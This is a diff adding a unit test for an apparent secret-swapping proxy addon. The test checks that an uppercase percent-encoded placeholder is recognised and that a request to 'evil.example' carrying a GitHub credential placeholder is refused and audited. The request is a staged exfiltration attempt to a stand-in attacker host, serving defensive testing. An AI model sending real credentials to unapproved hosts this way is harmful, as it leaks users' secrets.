@@ -1058,6 +1058,17 @@ class SwapAddonTests(unittest.TestCase):
         a.request(Flow(req))
         self.assertEqual(a.refused, [])
 
+    def test_warn_placeholder_encoded_uppercase_prefix_audits(self):
+        """The percent-encoded placeholder regex is case-insensitive by
+        design (re.IGNORECASE), so an uppercase `HSURR%3A` prefix IS a
+        real placeholder to the swap engine — and the warn path audits
+        it in wire case, exactly the name the engine would resolve."""
+        a = make_addon()
+        req = Request("evil.example", "/", content=b"key=HSURR%3Agithub")
+        a.request(Flow(req))
+        self.assertIn(("evil.example", "github", "host-not-allowlisted"),
+                      a.refused)
+
     def test_nit_multi_entry_bad_line_warns(self):
         """REVIEW item 40b: a non-k=v line in a multi file is dropped with
         a warning naming the line number, never the content."""
